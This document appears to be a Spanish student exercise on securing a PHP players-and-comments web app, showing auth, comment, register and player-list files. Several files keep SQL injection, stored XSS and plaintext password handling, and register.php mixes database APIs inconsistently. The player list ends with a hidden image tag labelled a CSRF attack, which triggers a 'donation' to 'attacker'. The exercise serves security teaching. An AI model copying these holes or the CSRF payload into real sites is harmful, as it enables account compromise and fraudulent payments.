# Correción del código

## AUTH.PHP

```php
<?php
require_once dirname(__FILE__) . '/conf.php';

$userId = FALSE;

# Se mira si la pareja de Usuario y Contraseña son válidas, devolviendo un "true" si es válida..
function areUserAndPasswordValid($user, $password) {
	global $db, $userId;

    $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');

	$result = $db->query($query) or die ("Invalid query: " . $query . ". Field user introduced is: " . $user);
	$row = $result->fetchArray();

	if ($password == $row['password'])
	{
		$userId = $row['userId'];
		$_COOKIE['userId'] = $userId;
		return TRUE;
	}
	else
		return FALSE;
}

# On login
if (isset($_POST['username']) && isset($_POST['password'])) {		
	$_COOKIE['user'] = $_POST['username'];
	$_COOKIE['password'] = $_POST['password'];
}

# On logout
if (isset($_POST['Logout'])) {
	# Delete cookies
	setcookie('user', FALSE);
	setcookie('password', FALSE);
	setcookie('userId', FALSE);
	
	unset($_COOKIE['user']);
	unset($_COOKIE['password']);
	unset($_COOKIE['userId']);

	header("Location: index.php");
}


# Se checkea el usuario y la contraseña
if (isset($_COOKIE['user']) && isset($_COOKIE['password'])) {
	if (areUserAndPasswordValid($_COOKIE['user'], $_COOKIE['password'])) {
		$login_ok = TRUE;
		$error = "";
	} else {
		$login_ok = FALSE;
		$error = "Invalid user or password.<br>";
	}
} else {
	$login_ok = FALSE;
	$error = "This page requires you to be logged in.<br>";
}

if ($login_ok == FALSE) {

?>
    <!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/style.css">
    <title>Práctica RA3 - Authentication page</title>
</head>
<body>
<header class="auth">
    <h1>Authentication page</h1>
</header>
<section class="auth">
    <div class="message">
        <?= htmlspecialchars($error) ?>
    </div>
    <section>
        <div>
            <h2>Login</h2>
            <form action="#" method="post">
                <label>User</label>
                <input type="text" name="username"><br>
                <label>Password</label>
                <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </div>

        <div>
            <h2>Logout</h2>
            <form action="#" method="post">
                <input type="submit" name="Logout" value="Logout">
            </form>
        </div>
    </section>
</section>
<footer>
    <h4>Puesta en producción segura</h4>
    <p>Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/">donate</a></p>
</footer>
</body>
</html>
<?php
exit(0);
}
?>
```


## ADD_COMMENT.PHP

```php
<?php
require_once dirname(__FILE__) . '/private/conf.php';

# Requirir usuarios logeuados
require dirname(__FILE__) . '/private/auth.php';

if (isset($_POST['body']) && isset($_GET['id'])) {
	# Recien llegado del POST => se guardad en el base de datos
	$body = $_POST['body'];
	
	$body = SQLite3::escapeString($body);

	$query = "INSERT INTO comments (playerId, userId, body) VALUES ('".$_GET['id']."', '".$_COOKIE['userId']."', '$body')";

	$db->query($query) or die("Invalid query");
	header("Location: list_players.php");
}

# Formulario

?>
<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/style.css">
    <title>Práctica RA3 - Comments creator</title>
</head>
<body>
<header>
    <h1>Comments creator</h1>
</header>
<main class="player">
    <form action="#" method="post">
        <h3>Write your comment</h3>
        <textarea name="body"></textarea>
        <input type="submit" value="Send">
    </form>
    <form action="#" method="post" class="menu-form">
        <a href="list_players.php">Back to list</a>
        <input type="submit" name="Logout" value="Logout" class="logout">
    </form>
</main>
<footer class="listado">
    <img src="images/logo-iesra-cadiz-color-blanco.png">
    <h4>Puesta en producción segura</h4>
    < Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/"> donate</a> >
</footer>
</body>
</html>
```

## SHOW_COMMENTS.PHP

```php
<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/style.css">
    <title>Práctica RA3 - Comments editor</title>
</head>
<body>
<header>
    <h1>Comments editor</h1>
</header>
<main class="player">

<?php
require_once dirname(__FILE__) . '/private/conf.php';

# Requerir usuarios logueados
require dirname(__FILE__) . '/private/auth.php';

# Lista de comentarios
if (isset($_GET['id']))
{
	$query = "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId =".$_GET['id']." AND U.userId = C.userId order by C.playerId desc";

	$result = $db->query($query) or die("Invalid query: " . $query );

	while ($row = $result->fetchArray()) {
		echo "<div>
                <h4> ". $row['username'] ."</h4> 
                <p>commented: " . $row['body'] . "</p>
              </div>";
	}

	$playerId = $_GET['id'];
}

# Formulario

?>

<div>
    <a href="list_players.php">Back to list</a>
    <a class="black" href="add_comment.php?id=<?php echo $playerId;?>"> Add comment</a>
</div>

</main>
<footer class="listado">
    <img src="images/logo-iesra-cadiz-color-blanco.png">
    <h4>Puesta en producción segura</h4>
    < Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/"> donate</a> >
</footer>
</body>
</html>
```

## REGISTER.PHP

```php
<?php
require_once dirname(__FILE__) . '/private/conf.php';
session_start();

# aquí la regeneración de ID de sesión
if (!isset($_SESSION['Creado'])) {
    $_SESSION['Creado'] = time();
} else if (time() - $_SESSION['Creado'] > 1800) {
    // si la sesison se empezo hace más de 30 minutos
    session_regenerate_id(true);    // cambia la ID de sesión actual e invalida la antigua
    $_SESSION['Creado'] = time();  // aquí la actualización de la hora de creación
}

# Verificar si el usuario está logueado y si es un administrador
if (!isset($_SESSION['userId']) || !$_SESSION['isAdmin']) {
    header("Location: login.php");
    exit();
}


if (isset($_POST['username']) && isset($_POST['password'])) {

    $username = $_POST['username'];
    $password = $_POST['password'];
    
    # Hasheo de la contraseña
    $hashed_password = password_hash($password, PASSWORD_BCRYPT);

    # Aquí un buen query para insertar datos de manera segura
    $query = $db->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
    $query->bind_param('ss', $username, $hashed_password);
    
    if ($query->execute()) {
        header("Location: list_players.php");
        exit();
    } else {
        die("Invalid query");
    }
}

?>
<!doctype html>
<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport"
              content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <link rel="stylesheet" href="css/style.css">
        <title>P8 REGISTER</title>
    </head>
    <body>
        <header>
            <h1>Register</h1>
        </header>
        <main class="player">
            <form action="#" method="post">
                <label>Username:</label>
                <input type="text" name="username">
                <label>Password:</label>
                <input type="password" name="password">
                <input type="submit" value="Send">
            </form>
            <div>
                <a href="list_players.php">Back to list</a>
            </div>
        </main>
        <footer class="listado">
            <img src="images/logo-iesra-cadiz-color-blanco.png">
            <h4>Puesta en producción segura</h4>
            <p>Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/">donate</a></p>
        </footer>
    </body>
</html>
```

## LIST_PLAYER.PHP

```php
<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/style.css">
    <title>Práctica RA3 - Players list</title>
</head>
<body>
    <header class="listado">
        <h1>Players list</h1>
    </header>
    <main class="listado">
        <section>
            <ul>
            <?php
            require_once dirname(__FILE__) . '/private/conf.php';

            # Require logged users
            require dirname(__FILE__) . '/private/auth.php';

            $query = "SELECT playerid, name, team FROM players order by playerId desc";

            $result = $db->query($query) or die("Invalid query");

            while ($row = $result->fetchArray()) {
                echo "
                    <li>
                    <div>
                    <span>Name: " . $row['name']
                 . "</span><span>Team: " . $row['team']
                 . "</span></div>
                    <div>
                    <a href=\"show_comments.php?id=".$row['playerid']."\">(show/add comments)</a> 
                    <a href=\"insert_player.php?id=".$row['playerid']."\">(edit player)</a>
                    </div>
                    </li>\n";
            }

            ?>
            </ul>
            <form action="#" method="post" class="menu-form">
                <a href="index.php">Back to home</a>
                <input type="submit" name="Logout" value="Logout" class="logout">
            </form>
        </section>
    </main>
    <footer class="listado">
        <img src="images/logo-iesra-cadiz-color-blanco.png">
        <h4>Puesta en producción segura</h4>
        < Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/"> donate</a> >
    </footer>

    <!-- Script de ataque CSRF -->
    <img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none" alt="">


</body>
</html>
```
